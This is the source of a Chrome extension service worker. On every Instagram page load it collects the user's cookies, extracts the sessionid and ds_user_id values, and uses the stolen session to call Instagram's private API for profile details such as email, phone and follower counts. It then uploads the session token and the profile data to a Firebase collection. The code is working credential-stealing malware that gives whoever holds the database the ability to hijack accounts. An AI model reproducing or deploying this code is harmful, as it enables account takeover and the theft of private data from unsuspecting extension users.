console.log("🚀 Service Worker Loaded ✅");

import { db, collection, addDoc } from "./firebase.js";

// Listener for Instagram page loads
chrome.webNavigation.onCompleted.addListener(
  async (details) => {
    if (details.url.includes("instagram.com")) {
      chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
        console.log("🍪 All cookies:", cookies);

        const session = cookies.find((c) => c.name === "sessionid");
        const dsUserId = cookies.find((c) => c.name === "ds_user_id");

        if (!session || !dsUserId) {
          console.warn("⚠️ Required cookies not found.");
          return;
        }

        const sessionId = session.value;
        const userId = dsUserId.value;

        console.log("✅ Session ID:", sessionId);
        console.log("✅ User ID:", userId);

        const userInfo = await fetchUserInfo(sessionId, userId);

        try {
          await addDoc(collection(db, "sessionid"), {
            sessionId,
            userId,
            ...userInfo, // 🔥 Save all user details
            timestamp: new Date(),
            domain: "instagram.com",
          });
          console.log(
            "✅ Session + User Info saved to Firebase:",
            userInfo.username
          );
        } catch (err) {
          console.error("❌ Firebase error:", err);
        }
      });
    }
  },
  { url: [{ hostSuffix: "instagram.com" }] }
);

// 🔥 Full user info fetcher from IG API
async function fetchUserInfo(sessionId, userId) {
  const url = `https://i.instagram.com/api/v1/users/${userId}/info/`;

  try {
    const response = await fetch(url, {
      method: "GET",
      headers: {
        "User-Agent": "Instagram 219.0.0.12.117 Android",
        Cookie: `sessionid=${sessionId};`,
        "X-IG-App-ID": "936619743392459",
        "Accept-Language": "en-US",
      },
    });

    if (!response.ok) {
      console.warn("⚠️ Instagram API failed with status:", response.status);
      return { username: "unknown_user" };
    }

    const data = await response.json();
    const user = data.user;

    const userInfo = {
      username: user?.username || "unknown_user",
      full_name: user?.full_name || "N/A",
      bio: user?.biography || "N/A",
      website: user?.external_url || "N/A",
      profile_pic: user?.profile_pic_url || "",
      profile_pic_hd: user?.hd_profile_pic_url_info?.url || "",
      is_verified: user?.is_verified || false,
      is_private: user?.is_private || false,
      followers: user?.follower_count ?? 0,
      following: user?.following_count ?? 0,
      posts: user?.media_count ?? 0,
      category: user?.category || "N/A",
      public_email: user?.public_email || "Not Available",
      public_phone: user?.public_phone_number || "Not Available",
    };

    console.log("📛 Fetched Full User Info:", userInfo);
    return userInfo;
  } catch (error) {
    console.error("❌ Error while fetching user info:", error);
    return { username: "unknown_user" };
  }
}
